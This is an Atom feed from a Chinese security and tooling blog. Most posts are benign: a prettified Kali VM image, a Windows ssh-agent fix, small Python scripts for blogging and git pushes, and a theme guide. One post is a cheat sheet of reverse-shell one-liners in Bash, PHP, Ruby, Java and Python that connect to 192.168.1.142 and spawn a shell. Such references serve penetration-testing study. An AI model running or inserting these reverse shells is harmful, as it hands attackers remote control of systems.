<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  
  <subtitle>web安全与二进制路上挣扎前行的自留地</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2018-09-07T08:34:33.085Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Kali Linux Xfce版美化虚拟机镜像</title>
    <link href="http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html"/>
    <id>http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html</id>
    <published>2018-09-04T02:59:43.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。</p><p><code>Kali</code> 一直用的是 <code>xfce</code> 版本，至于为什么用这个版本，是因为我感觉 <code>gnome3</code> 在虚拟机上表现欠佳。当然，默认的 <code>gnome3</code> 看起来还是不错的，而 <code>xfce</code> 默认的就看起来很寒碜了</p><p>默认的 <code>Kali-Xfce</code> 是这个样子的</p><a id="more"></a><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxco29z1zj20le0c0146.jpg" alt="原版kali-xfce"></p><p>具体过程不表了，如果有人有需要我再发吧，毕竟这次美化过程没有记录，我也懒得再重操一遍了，直接上美化后的截图吧</p><h2 id="美化截图"><a href="#美化截图" class="headerlink" title="美化截图"></a>美化截图</h2><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxcov30z4j21hc0u07bd.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxd0a4t5ej21hc0u0u0x.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxd11uu4qj21hc0u0b29.jpg" alt=""></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>注意是64位的镜像，需要cpu虚拟化开启支持</strong></p><p>直接解压然后导入vmware（version &gt;= 10.X）虚拟机即可，默认账户密码为 <code>root:toor</code></p><p>软件源已改为国内的中科大源，不需要自己换</p><h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>已更新到 <code>2018-09-04</code> 最新，如果需要更新可以运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt upadte</span><br><span class="line">apt full-upgrade</span><br></pre></td></tr></table></figure><h3 id="顶栏透明"><a href="#顶栏透明" class="headerlink" title="顶栏透明"></a>顶栏透明</h3><p>图片上的顶栏可以改为透明的，在顶栏上右键然后找到 <code>面板首选项 -&gt; 外观 -&gt; alpha</code> 改为 <code>0</code> ，顶栏可透明</p><h3 id="更新vmtool"><a href="#更新vmtool" class="headerlink" title="更新vmtool"></a>更新vmtool</h3><p>打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>如果有新版本vmtool会提示更新</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大小: 3649679846 字节</span><br><span class="line">修改时间: 2018年9月4日, 11:18:46</span><br><span class="line">MD5: EDC1BF26205D06EA668F8EA03A05D456</span><br><span class="line">SHA1: 4C2F32BA2DDC53425F34B4316F55C66755A08ACA</span><br><span class="line">CRC32: A51255F0</span><br></pre></td></tr></table></figure><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><ul><li><a href="https://pan.baidu.com/s/1Neyff9GpVm08w5A6lesmQQ" target="_blank" rel="noopener">百度网盘 | 密码: jcus</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Kali&lt;/code&gt; 一直用的是 &lt;code&gt;xfce&lt;/code&gt; 版本，至于为什么用这个版本，是因为我感觉 &lt;code&gt;gnome3&lt;/code&gt; 在虚拟机上表现欠佳。当然，默认的 &lt;code&gt;gnome3&lt;/code&gt; 看起来还是不错的，而 &lt;code&gt;xfce&lt;/code&gt; 默认的就看起来很寒碜了&lt;/p&gt;
&lt;p&gt;默认的 &lt;code&gt;Kali-Xfce&lt;/code&gt; 是这个样子的&lt;/p&gt;
    
    </summary>
    
      <category term="Kali" scheme="http://hacktech.cn/categories/Kali/"/>
    
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="Kali" scheme="http://hacktech.cn/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>win10 1803版本unable to start ssh-agent service, error :1058</title>
    <link href="http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html"/>
    <id>http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html</id>
    <published>2018-09-01T08:26:11.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>PowerShell安装了pshazz或者posh-git，但是打开的时候提示 <code>unable to start ssh-agent service, error :1058</code>  </p><a id="more"></a><p>1803的设置上面可以看到这个版本是默认带了openssh客户端的，我们不需要另外去安装，但是命令行运行 <code>ssh-agent</code> 依然是显示 <code>unable to start ssh-agent service, error :1058</code>  </p><p>既然有这个东西，但是服务启动失败，那我们看看本地服务，果然，在本地服务中禁用了，我们改成手动或者自动就能解决这个问题了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PowerShell安装了pshazz或者posh-git，但是打开的时候提示 &lt;code&gt;unable to start ssh-agent service, error :1058&lt;/code&gt;  &lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
      <category term="Win10" scheme="http://hacktech.cn/tags/Win10/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell以及端口转发的方法收集</title>
    <link href="http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html"/>
    <id>http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html</id>
    <published>2018-08-23T08:03:29.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.1.142/80</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> </span><br><span class="line"><span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r ‘$sock=fsockopen(“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>);exec(“/bin/sh -i &lt;&amp;<span class="number">3</span> &gt;&amp;<span class="number">3</span> <span class="number">2</span>&gt;&amp;<span class="number">3</span>”);’</span><br><span class="line">(Assumes TCP uses file descriptor <span class="number">3.</span> <span class="keyword">If</span> it doesn’t work, <span class="keyword">try</span> <span class="number">4</span>,<span class="number">5</span>, <span class="keyword">or</span> <span class="number">6</span>)</span><br></pre></td></tr></table></figure><h2 id="RUBY"><a href="#RUBY" class="headerlink" title="RUBY"></a>RUBY</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e’f=TCPSocket.open(“<span class="number">192.168</span>.<span class="number">1.142</span>”,<span class="number">80</span>).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d <span class="number">2</span>&gt;&amp;%d”,f,f,f)’</span><br></pre></td></tr></table></figure><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([“/bin/bash”,”-c”,”exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.1.142/<span class="number">80</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> \$line <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done”] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c ‘<span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/80 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; 5&amp;lt;&amp;gt;/dev/tcp/192.168.1.142/80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;lt;&amp;amp;5 | &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# or:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line 0&amp;lt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>为纸小墨一键创建md文件</title>
    <link href="http://hacktech.cn/2018/08/22/ink-create-md.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-create-md.html</id>
    <published>2018-08-22T10:17:23.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python the.py file_name [article_title] [author_id]</span><br><span class="line"><span class="comment"># []括起来为可选项</span></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_name = <span class="string">''</span></span><br><span class="line">    post_title = <span class="string">''</span></span><br><span class="line">    author = <span class="string">'me'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">4</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        author = str(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Usage: \n\t%s file_name [article_title] [author_id]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./blog/source/%s.md'</span> % file_name, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'title: %s\n'</span> % post_title)</span><br><span class="line">        f.write(<span class="string">'date: %s\n'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()))</span><br><span class="line">        f.write(<span class="string">'update: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'author: %s\n'</span> % author)</span><br><span class="line">        f.write(<span class="string">'tags: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'categories: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'topic: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'cover: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'draft: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'preview: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'top: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'type: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'hide: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'config: null\n'</span>)</span><br><span class="line">        f.write(<span class="string">'\n\n---\n\n\n\n'</span>)</span><br><span class="line">    print(<span class="string">'Create %s.md Finished'</span> % file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python the.py file_name [article_title] [author_id]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# []括起来为可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>一键git push脚本(python版)</title>
    <link href="http://hacktech.cn/2018/08/22/git-push-python-script.html"/>
    <id>http://hacktech.cn/2018/08/22/git-push-python-script.html</id>
    <published>2018-08-22T09:34:24.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gitconfig = &#123;</span><br><span class="line">    <span class="string">'cwd'</span>: <span class="string">'./blog/public'</span>,</span><br><span class="line">    <span class="string">'git'</span>: &#123;</span><br><span class="line">        <span class="string">'github'</span>: [<span class="string">'git@github.com:akkuman/akkuman.github.io.git'</span>, <span class="string">'master'</span>],</span><br><span class="line">        <span class="string">'coding'</span>: [<span class="string">'git@git.coding.net:Akkuman/Akkuman.git'</span>, <span class="string">'coding-pages'</span>],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gitconfig</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change working directory</span></span><br><span class="line">    os.chdir(gitconfig.get(<span class="string">'cwd'</span>, <span class="string">'.'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if git init</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'.git'</span> <span class="keyword">not</span> <span class="keyword">in</span> os.listdir():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'init'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if remote in config, if not, add the remote</span></span><br><span class="line">    git_remotes = subprocess.check_output([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'-v'</span>])</span><br><span class="line">    git_remotes_str = bytes.decode(git_remotes).strip()</span><br><span class="line">    git_remotes_list = [line.split()[<span class="number">0</span>] <span class="keyword">for</span> line <span class="keyword">in</span> git_remotes_str.split(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> git_remotes_list:</span><br><span class="line">            subprocess.check_call([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'add'</span>, k, v[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add . &amp; commit with message</span></span><br><span class="line">    subprocess.check_call([<span class="string">'git'</span>, <span class="string">'add'</span>, <span class="string">'.'</span>])</span><br><span class="line">    commit_message = <span class="string">'Site updated: %s'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        commit_message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    subprocess.call([<span class="string">'git'</span>, <span class="string">'commit'</span>, <span class="string">'-m'</span>, commit_message])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push to every remote repo</span></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'push'</span>, k, <span class="string">'master:%s'</span> % v[<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span>:</span><br><span class="line">            print(<span class="string">'Usage:\n\t%s [commit_message]'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>纸小墨ink简洁主题story爱上你的故事</title>
    <link href="http://hacktech.cn/2018/08/22/ink-theme-story.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-theme-story.html</id>
    <published>2018-08-22T07:36:42.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主题介绍"><a href="#主题介绍" class="headerlink" title="主题介绍"></a>主题介绍</h2><p>为纸小墨写的一款主题,该主题移植自<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a><br><!--和[Artifact.](https://artifact.me/)--></p><p>github地址：<a href="https://github.com/akkuman/ink-theme-story" target="_blank" rel="noopener">ink-theme-story</a></p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><a href="https://ink-theme-story.pancakeapps.com" target="_blank" rel="noopener">ink-theme-story</a></p><a id="more"></a><h3 id="主题的一些食用说明"><a href="#主题的一些食用说明" class="headerlink" title="主题的一些食用说明"></a>主题的一些食用说明</h3><h4 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h4><p>标题旁边有一个 · 字符，点击后便可显示菜单。<strong>1</strong>,<strong>2</strong>,<strong>3</strong> 分别代表 <strong>独立页面菜单</strong>、<strong>导航树</strong>(仅在文章界面有用)以及<strong>搜索框</strong>。</p><h3 id="一些功能"><a href="#一些功能" class="headerlink" title="一些功能"></a>一些功能</h3><ul><li>评论点击加载, 可以应对一些墙导致无法加载的场景</li><li>图片懒加载</li><li>评论系统支持来必力, Disqus, Gitment, 默认为Disqus</li><li>…</li></ul><h2 id="主题截图"><a href="#主题截图" class="headerlink" title="主题截图"></a>主题截图</h2><p><img src="https://i.loli.net/2018/08/20/5b7a62b4ce584.png" alt="Screenshot_20180820_143859.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><p>进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录</p><p>然后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akkuman/ink-theme-story.git</span><br></pre></td></tr></table></figure></p><p>或者下载git压缩包后解压到blog文件夹</p><p>现在你可以看到blog目录下的ink-theme-story目录</p><p>然后修改站点配置文件<code>blog/config.yml</code></p><p>站点配置文件一般如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">site:</span></span><br><span class="line"><span class="attr">    title:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">    subtitle:</span> <span class="string">"Akkuman的技术博客"</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">    theme:</span> <span class="string">ink-theme-story</span></span><br><span class="line"><span class="attr">    lang:</span> <span class="string">zh</span></span><br><span class="line"><span class="attr">    url:</span> <span class="string">"ink-theme-story.pancakeapps.com"</span></span><br><span class="line"><span class="attr">    comment:</span> <span class="string">Akkuman</span></span><br><span class="line"><span class="attr">    logo:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line">    <span class="comment"># link: 